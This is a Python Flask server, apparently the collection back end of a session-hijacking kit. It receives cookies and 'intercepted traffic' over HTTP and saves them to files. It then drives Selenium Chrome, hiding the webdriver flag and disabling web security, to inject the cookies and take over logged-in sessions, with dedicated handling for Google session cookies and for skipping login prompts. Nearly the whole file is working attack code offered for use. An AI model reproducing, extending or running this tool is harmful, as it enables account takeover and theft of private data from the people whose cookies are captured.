from flask import Flask, request, jsonify
from datetime import datetime
import json
import webbrowser
import os
import tempfile
import time
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager
import threading
from urllib.parse import urlparse, parse_qs
import requests
import logging
import sys
from werkzeug.serving import make_server
import signal

# Custom logging setup
class PlainFormatter(logging.Formatter):
    """Plain formatter without colors"""
    
    def format(self, record):
        # Format timestamp
        timestamp = datetime.now().strftime('%H:%M:%S')
        
        # Create simple format
        if record.levelname == 'INFO':
            return f"[{timestamp}] {record.getMessage()}"
        else:
            return f"[{timestamp}] {record.levelname}: {record.getMessage()}"

# Setup custom logger
logger = logging.getLogger('cookie_server')
logger.setLevel(logging.INFO)
handler = logging.StreamHandler(sys.stdout)
handler.setFormatter(PlainFormatter())
logger.addHandler(handler)

# Disable Flask and Werkzeug logs
logging.getLogger('werkzeug').disabled = True
logging.getLogger('flask').disabled = True

# Disable Selenium logs
logging.getLogger('selenium').setLevel(logging.CRITICAL)
logging.getLogger('urllib3').setLevel(logging.CRITICAL)

# Create Flask app
app = Flask(__name__)
app.logger.disabled = True

# Global variables to track login state
login_in_progress = False
login_success = False
login_lock = threading.Lock()

# Traffic storage
traffic_data = []

def extract_domain(url):
    """Extract domain from URL"""
    parsed_url = urlparse(url)
    domain = parsed_url.netloc
    if domain.startswith('www.'):
        domain = domain[4:]
    return domain

def get_base_domain(url):
    """Extract base domain from URL (e.g., google.com from mail.google.com)"""
    domain = extract_domain(url)
    parts = domain.split('.')
    if len(parts) > 2:
        # For domains like mail.google.com, we want google.com
        return '.'.join(parts[-2:])
    return domain

def parse_cookie_string(cookie_string, base_domain):
    """Parse cookie string into list of cookie dictionaries"""
    cookies = []
    cookie_pairs = cookie_string.split('; ')
    
    for pair in cookie_pairs:
        if '=' in pair:
            name, value = pair.split('=', 1)
            cookie_dict = {
                'name': name.strip(),
                'value': value.strip(),
                'domain': f".{base_domain}",
                'path': '/',
                'secure': True,
                'httpOnly': False
            }
            
            # Special handling for secure cookies
            if name.startswith('__Secure-'):
                cookie_dict['secure'] = True
            if name.startswith('__Host-'):
                cookie_dict['domain'] = base_domain
                cookie_dict['path'] = '/'
            
            cookies.append(cookie_dict)
    
    return cookies

def login_with_cookies(cookies, website_url):
    """Login using cookies with proper website authentication flow"""
    global login_in_progress, login_success
    
    with login_lock:
        if login_in_progress:
            logger.info("⚠️  Login already in progress, skipping...")
            return False
        
        if login_success:
            logger.info("✅ Login already successful, skipping...")
            return True
            
        login_in_progress = True
    
    try:
        domain = extract_domain(website_url)
        base_domain = get_base_domain(website_url)
        logger.info(f"Starting login process for {website_url} (domain: {domain}, base_domain: {base_domain}) with {len(cookies)} cookies")
        
        # Chrome options for visible browser
        chrome_options = Options()
        chrome_options.add_argument("--disable-blink-features=AutomationControlled")
        chrome_options.add_argument("--disable-web-security")
        chrome_options.add_argument("--disable-features=VizDisplayCompositor")
        chrome_options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
        chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
        chrome_options.add_experimental_option('useAutomationExtension', False)
        
        # Disable logging
        chrome_options.add_argument("--log-level=3")
        chrome_options.add_argument("--disable-logging")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--no-sandbox")
        
        service = Service(ChromeDriverManager().install())
        
        # Suppress ChromeDriverManager logs
        os.environ['WDM_LOG_LEVEL'] = '0'
        
        driver = webdriver.Chrome(service=service, options=chrome_options)
        
        # Remove webdriver detection
        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        
        # Special handling for Google services
        if base_domain == "google.com":
            logger.info("Detected Google service, using special handling...")
            return handle_google_login(driver, cookies, website_url, base_domain)
        
        # Step 1: Go to the base domain to set cookies
        base_url = f"https://{base_domain}"
        logger.info(f"Step 1: Setting up cookies on {base_url}...")
        driver.get(base_url)
        time.sleep(2)
        
        # Clear existing cookies
        driver.delete_all_cookies()
        
        # Add cookies
        cookies_added = 0
        for cookie in cookies:
            try:
                # Ensure domain is properly formatted
                cookie_domain = cookie.get('domain', f".{base_domain}")
                if not cookie_domain.startswith('.'):
                    cookie_domain = f".{cookie_domain}"
                
                cookie_to_add = {
                    'name': cookie['name'],
                    'value': cookie['value'],
                    'domain': cookie_domain,
                    'path': cookie.get('path', '/'),
                    'secure': cookie.get('secure', True)
                }
                driver.add_cookie(cookie_to_add)
                cookies_added += 1
                logger.info(f"Added cookie: {cookie['name']}")
            except Exception as e:
                logger.info(f"Failed to add cookie {cookie['name']}: {e}")
        
        logger.info(f"Successfully added {cookies_added}/{len(cookies)} cookies")
        
        # Step 2: Test access to the website
        logger.info(f"Step 2: Testing access to {website_url}...")
        driver.get(website_url)
        time.sleep(5)
        
        # Check login status
        current_url = driver.current_url
        logger.info(f"Current URL: {current_url}")
        
        # Determine if login was successful
        login_keywords = ['login', 'signin', 'auth', 'account', 'sign-in']
        is_logged_in = True
        
        # Check if current URL contains any login keyword
        for keyword in login_keywords:
            if keyword in current_url.lower():
                is_logged_in = False
                break
        
        # Check if we are still on the same domain
        parsed_target = urlparse(website_url)
        parsed_current = urlparse(current_url)
        if parsed_target.netloc != parsed_current.netloc:
            is_logged_in = False
        
        if is_logged_in:
            logger.info("SUCCESS: Already logged in!")
            login_success = True
            
            # Take success screenshot
            timestamp = int(time.time())
            screenshot_path = os.path.join(tempfile.gettempdir(), f"login_success_{timestamp}.png")
            driver.save_screenshot(screenshot_path)
            logger.info(f"Success screenshot: {screenshot_path}")
            
            # Wait a bit to ensure page is fully loaded
            time.sleep(3)
            
            # Open in default browser
            logger.info(f"Opening {website_url} in your default browser...")
            webbrowser.open(website_url)
            
        else:
            logger.info("Still on login page, attempting recovery...")
            
            # Try alternative approaches
            recovery_attempts = [
                ("Original URL", website_url),
                ("Base path", website_url.rstrip('/')),
                ("With www", add_www(website_url)),
                ("Without www", remove_www(website_url)),
                ("HTTPS", ensure_https(website_url)),
                ("HTTP", ensure_http(website_url))
            ]
            
            for attempt_name, url in recovery_attempts:
                logger.info(f"Trying {attempt_name}: {url}...")
                driver.get(url)
                time.sleep(4)
                
                current_url = driver.current_url
                # Check if we're on the same domain and not on a login page
                parsed_current = urlparse(current_url)
                same_domain = parsed_current.netloc == parsed_target.netloc or \
                              parsed_current.netloc == f"www.{parsed_target.netloc}" or \
                              parsed_current.netloc == parsed_target.netloc.replace("www.", "")
                
                not_login_page = all(keyword not in current_url.lower() for keyword in login_keywords)
                
                if same_domain and not_login_page:
                    logger.info(f"SUCCESS via {attempt_name}!")
                    login_success = True
                    webbrowser.open(current_url)
                    break
                else:
                    logger.info(f"{attempt_name} failed")
            
            if not login_success:
                logger.info("All login attempts failed")
                logger.info("Possible reasons:")
                logger.info("   - Cookies have expired")
                logger.info("   - Website requires additional verification")
                logger.info("   - Account has 2FA enabled")
                logger.info("   - Session was invalidated")
                
                # Take failure screenshot
                timestamp = int(time.time())
                screenshot_path = os.path.join(tempfile.gettempdir(), f"login_failed_{timestamp}.png")
                driver.save_screenshot(screenshot_path)
                logger.info(f"Failure screenshot: {screenshot_path}")
        
        # Keep browser open for inspection
        inspection_time = 30 if login_success else 60
        logger.info(f"Browser will remain open for {inspection_time} seconds for inspection...")
        time.sleep(inspection_time)
        
        driver.quit()
        return login_success
        
    except Exception as e:
        logger.error(f"Error during login: {str(e)}")
        return False
    finally:
        login_in_progress = False

def handle_google_login(driver, cookies, website_url, base_domain):
    """Special handling for Google services login"""
    global login_success
    
    try:
        logger.info("Starting Google-specific login process...")
        
        # Step 1: Go to Google homepage
        home_url = "https://www.google.com"
        logger.info(f"Navigating to Google homepage: {home_url}")
        driver.get(home_url)
        time.sleep(3)
        
        # Clear existing cookies
        driver.delete_all_cookies()
        
        # Add cookies with more precise domain handling
        cookies_added = 0
        for cookie in cookies:
            try:
                # For Google, we need to be more precise with domains
                cookie_name = cookie['name']
                cookie_value = cookie['value']
                
                # Determine the best domain for this cookie
                cookie_domain = cookie.get('domain', f".{base_domain}")
                if not cookie_domain.startswith('.'):
                    cookie_domain = f".{cookie_domain}"
                
                # Special handling for different cookie types
                if cookie_name.startswith('__Secure-3P'):
                    # 3P cookies are usually for the specific subdomain
                    specific_domain = f".{extract_domain(website_url)}"
                    cookie_domain = specific_domain
                elif cookie_name in ['SID', 'HSID', 'SSID', 'APISID', 'SAPISID', 'NID']:
                    # These are important cookies that should be set on the base domain
                    cookie_domain = f".{base_domain}"
                
                # Add cookie to the determined domain
                cookie_to_add = {
                    'name': cookie_name,
                    'value': cookie_value,
                    'domain': cookie_domain,
                    'path': cookie.get('path', '/'),
                    'secure': cookie.get('secure', True)
                }
                driver.add_cookie(cookie_to_add)
                cookies_added += 1
                logger.info(f"Added cookie: {cookie_name} with domain {cookie_domain}")
                
                # For important cookies, also add them to other domains
                if cookie_name in ['SID', 'HSID', 'SSID', 'APISID', 'SAPISID', 'NID']:
                    # Add to base domain if not already there
                    if cookie_domain != f".{base_domain}":
                        try:
                            base_cookie = cookie_to_add.copy()
                            base_cookie['domain'] = f".{base_domain}"
                            driver.add_cookie(base_cookie)
                            logger.info(f"Also added {cookie_name} to .{base_domain}")
                        except:
                            pass
                    
                    # Add to specific subdomain if not already there
                    specific_domain = f".{extract_domain(website_url)}"
                    if cookie_domain != specific_domain:
                        try:
                            specific_cookie = cookie_to_add.copy()
                            specific_cookie['domain'] = specific_domain
                            driver.add_cookie(specific_cookie)
                            logger.info(f"Also added {cookie_name} to {specific_domain}")
                        except:
                            pass
            except Exception as e:
                logger.info(f"Failed to add cookie {cookie['name']}: {e}")
        
        logger.info(f"Successfully added {cookies_added}/{len(cookies)} cookies")
        
        # Step 2: Try to authenticate with Google
        logger.info("Step 2: Authenticating with Google...")
        
        # First, try to access the Google Account page to trigger authentication
        account_url = "https://myaccount.google.com/"
        logger.info(f"Trying to access Google Account page: {account_url}")
        driver.get(account_url)
        time.sleep(5)
        
        # Check if we're on a login page
        current_url = driver.current_url
        logger.info(f"Current URL after accessing account page: {current_url}")
        
        # If we're on a login page, try to bypass it
        if "accounts.google.com" in current_url:
            logger.info("Detected login page, trying to bypass...")
            
            # Try to find and click any "Skip" or "Continue" buttons
            try:
                skip_buttons = driver.find_elements(By.XPATH, "//*[contains(text(), 'Skip') or contains(text(), 'Continue') or contains(text(), 'Next')]")
                if skip_buttons:
                    logger.info("Found potential skip/continue button")
                    skip_buttons[0].click()
                    time.sleep(5)
                    current_url = driver.current_url
                    logger.info(f"URL after clicking skip button: {current_url}")
            except Exception as e:
                logger.info(f"Error clicking skip button: {e}")
        
        # Step 3: Try to access the target service
        logger.info(f"Step 3: Testing access to {website_url}...")
        driver.get(website_url)
        time.sleep(5)
        
        # Check if we're logged in
        current_url = driver.current_url
        logger.info(f"Current URL: {current_url}")
        
        # Check if we're on a login page
        is_logged_in = "accounts.google.com" not in current_url
        
        if is_logged_in:
            logger.info("SUCCESS: Google login successful!")
            login_success = True
            
            # Take success screenshot
            timestamp = int(time.time())
            screenshot_path = os.path.join(tempfile.gettempdir(), f"google_success_{timestamp}.png")
            driver.save_screenshot(screenshot_path)
            logger.info(f"Success screenshot: {screenshot_path}")
            
            # Wait a bit to ensure page is fully loaded
            time.sleep(3)
            
            # Open in default browser
            logger.info(f"Opening {website_url} in your default browser...")
            webbrowser.open(website_url)
            
        else:
            logger.info("Google login failed, trying alternative approaches...")
            
            # Try alternative approaches specific to Google
            google_recovery_attempts = [
                ("Gmail Basic HTML", "https://mail.google.com/mail/u/0/h/"),
                ("Google Account", "https://myaccount.google.com/"),
                ("Google Drive", "https://drive.google.com/"),
                ("Google Calendar", "https://calendar.google.com/"),
                ("Google Search", "https://www.google.com/search?q=test"),
                ("Original URL", website_url)
            ]
            
            for attempt_name, url in google_recovery_attempts:
                logger.info(f"Trying {attempt_name}: {url}...")
                driver.get(url)
                time.sleep(5)
                
                current_url = driver.current_url
                # Check if we're not on a login page
                if "accounts.google.com" not in current_url:
                    logger.info(f"SUCCESS via {attempt_name}!")
                    login_success = True
                    webbrowser.open(current_url)
                    break
                else:
                    logger.info(f"{attempt_name} failed")
            
            if not login_success:
                logger.info("All Google login attempts failed")
                logger.info("Possible reasons:")
                logger.info("   - Cookies have expired")
                logger.info("   - Google requires additional verification")
                logger.info("   - Account has 2FA enabled")
                logger.info("   - Session was invalidated")
                
                # Take failure screenshot
                timestamp = int(time.time())
                screenshot_path = os.path.join(tempfile.gettempdir(), f"google_failed_{timestamp}.png")
                driver.save_screenshot(screenshot_path)
                logger.info(f"Failure screenshot: {screenshot_path}")
                
                # Try to extract more information about the login page
                try:
                    page_title = driver.title
                    logger.info(f"Page title: {page_title}")
                    
                    # Look for error messages
                    error_elements = driver.find_elements(By.XPATH, "//*[contains(@class, 'error') or contains(text(), 'error') or contains(text(), 'Error')]")
                    if error_elements:
                        for error in error_elements:
                            logger.info(f"Found error message: {error.text}")
                except Exception as e:
                    logger.info(f"Error extracting page information: {e}")
        
        # Keep browser open for inspection
        inspection_time = 30 if login_success else 60
        logger.info(f"Browser will remain open for {inspection_time} seconds for inspection...")
        time.sleep(inspection_time)
        
        return login_success
        
    except Exception as e:
        logger.error(f"Error during Google login: {str(e)}")
        return False

def add_www(url):
    """Add www to URL if not present"""
    parsed = urlparse(url)
    if not parsed.netloc.startswith('www.'):
        return parsed._replace(netloc='www.' + parsed.netloc).geturl()
    return url

def remove_www(url):
    """Remove www from URL if present"""
    parsed = urlparse(url)
    if parsed.netloc.startswith('www.'):
        return parsed._replace(netloc=parsed.netloc[4:]).geturl()
    return url

def ensure_https(url):
    """Ensure URL uses HTTPS"""
    if url.startswith("http://"):
        return url.replace("http://", "https://")
    return url

def ensure_http(url):
    """Ensure URL uses HTTP"""
    if url.startswith("https://"):
        return url.replace("https://", "http://")
    return url

@app.route('/store_cookies', methods=['POST'])
def store_cookies():
    global login_in_progress, login_success
    
    try:
        # Check if the request has JSON content
        if not request.is_json:
            logger.warning("Request is not JSON")
            return jsonify({'status': 'error', 'message': 'Request must be JSON'}), 400
        
        # Try to parse JSON
        try:
            data = request.get_json()
        except Exception as e:
            logger.error(f"Failed to parse JSON: {str(e)}")
            return jsonify({'status': 'error', 'message': 'Invalid JSON format'}), 400
        
        if not data:
            return jsonify({'status': 'error', 'message': 'No data provided'}), 400
        
        cookies_data = data.get('cookies', '')
        website_url = data.get('website_url', '')
        
        if not cookies_data:
            return jsonify({'status': 'error', 'message': 'No cookies provided'}), 400
        
        if not website_url:
            return jsonify({'status': 'error', 'message': 'No website URL provided'}), 400
        
        logger.info(f"Received cookies request for {website_url}")
        
        # Check if login is already in progress or successful
        if login_in_progress:
            logger.info("Login already in progress, rejecting new request")
            return jsonify({
                'status': 'info', 
                'message': 'Login already in progress',
                'login_in_progress': True
            }), 200
            
        if login_success:
            logger.info("Login already successful, rejecting new request")
            return jsonify({
                'status': 'info', 
                'message': 'Login already successful',
                'login_success': True
            }), 200
        
        # Parse cookies
        domain = extract_domain(website_url)
        base_domain = get_base_domain(website_url)
        if isinstance(cookies_data, str):
            cookies = parse_cookie_string(cookies_data, base_domain)
        else:
            cookies = cookies_data
        
        logger.info(f"Parsed {len(cookies)} cookies for domain {domain} (base: {base_domain})")
        
        # Save to file
        entry = {
            'website_url': website_url,
            'domain': domain,
            'base_domain': base_domain,
            'cookies': cookies,
            'timestamp': data.get('timestamp', int(time.time() * 1000)),
            'date': datetime.now().isoformat()
        }
        
        with open('cookies.json', 'a') as f:
            json.dump(entry, f, indent=2)
            f.write('\n')
        
        # Start login process only if not already running
        logger.info("Starting login process...")
        threading.Thread(target=login_with_cookies, args=(cookies, website_url), daemon=True).start()
        
        return jsonify({
            'status': 'success', 
            'cookies_count': len(cookies),
            'website_url': website_url,
            'message': 'Login process started'
        })
        
    except Exception as e:
        logger.error(f"Error: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/traffic', methods=['POST'])
def receive_traffic():
    """Receive intercepted traffic data in plaintext"""
    global traffic_data  # Declare global variable
    
    try:
        # Get form data with different variable names to avoid conflict
        traffic_str = request.form.get('traffic', '')
        timestamp_str = request.form.get('timestamp', '')
        
        if not traffic_str:
            return jsonify({'status': 'error', 'message': 'No traffic data provided'}), 400
        
        # Log traffic data in plaintext
        logger.info(f"Received traffic data at {datetime.fromtimestamp(int(timestamp_str)/1000).strftime('%H:%M:%S')}:")
        logger.info(traffic_str)
        
        # Add to traffic data list
        traffic_entry = {
            'data': traffic_str,
            'timestamp': int(timestamp_str),
            'date': datetime.now().isoformat()
        }
        traffic_data.append(traffic_entry)  # Now appending to the global list
        
        # Save to file in plaintext
        try:
            with open('traffic.txt', 'a') as f:
                f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {traffic_str}\n\n")
        except Exception as e:
            logger.error(f"Failed to save traffic data: {str(e)}")
        
        return jsonify({'status': 'success', 'message': 'Traffic data received'})
        
    except Exception as e:
        logger.error(f"Error processing traffic data: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/get_traffic', methods=['GET'])
def get_traffic():
    """Get all intercepted traffic data"""
    return jsonify({
        'status': 'success',
        'traffic_data': traffic_data,
        'count': len(traffic_data)
    })

@app.route('/clear_traffic', methods=['POST'])
def clear_traffic():
    """Clear all traffic data"""
    global traffic_data
    traffic_data = []
    logger.info("Traffic data cleared")
    return jsonify({'status': 'success', 'message': 'Traffic data cleared'})

@app.route('/login_status', methods=['GET'])
def login_status():
    """Check current login status"""
    global login_in_progress, login_success
    return jsonify({
        'login_in_progress': login_in_progress,
        'login_success': login_success
    })

@app.route('/reset_login', methods=['POST'])
def reset_login():
    """Reset login state (for testing/debugging)"""
    global login_in_progress, login_success
    login_in_progress = False
    login_success = False
    logger.info("Login state reset")
    return jsonify({'status': 'success', 'message': 'Login state reset'})

def signal_handler(sig, frame):
    """Handle graceful shutdown"""
    logger.info("Shutting down server...")
    sys.exit(0)

if __name__ == '__main__':
    # Setup signal handler for graceful shutdown
    signal.signal(signal.SIGINT, signal_handler)
    
    # Server configuration
    host = '0.0.0.0'
    port = 5000
    
    try:
        # Create server
        server = make_server(host, port, app, threaded=True)
        
        # Show startup info
        logger.info("Server starting up...")
        logger.info(f"Server running on: http://{host}:{port}")
        logger.info(f"Local access: http://localhost:{port}")
        logger.info(f"Network access: http://127.0.0.1:{port}")
        logger.info("Ready to handle cookie requests")
        logger.info("Press Ctrl+C to stop the server")
        
        # Start server
        server.serve_forever()
        
    except KeyboardInterrupt:
        logger.info("Server stopped by user")
    except Exception as e:
        logger.error(f"Failed to start server: {e}")
    finally:
        logger.info("Goodbye")